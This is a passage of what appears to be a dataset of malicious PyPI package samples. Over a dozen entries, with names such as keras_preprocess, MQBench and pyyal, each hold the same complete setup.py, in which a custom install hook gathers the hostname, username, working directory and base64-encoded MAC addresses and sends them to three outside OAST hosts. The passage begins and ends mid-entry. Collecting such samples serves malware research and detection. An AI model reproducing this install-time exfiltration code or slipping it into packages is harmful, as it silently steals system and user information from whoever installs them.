        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"kera_preprocessing\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-keras-preprocess-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"keras_preprocess\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-largebatchctr-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"LargeBatchCTR\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-larger-batch-ctr-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Larger-Batch-CTR\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-libbmet-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"libbmet\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-mqbench-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"MQBench\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-openfermionpyscaf-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"openfermionpyscaf\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-openfermionpyscanf-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"openfermionpyscanf\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-opteinsm-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"opteinsm\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-projectp-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"projectp\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-pyyal-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"pyyal\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-usss-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"usss\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-bytepps-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = 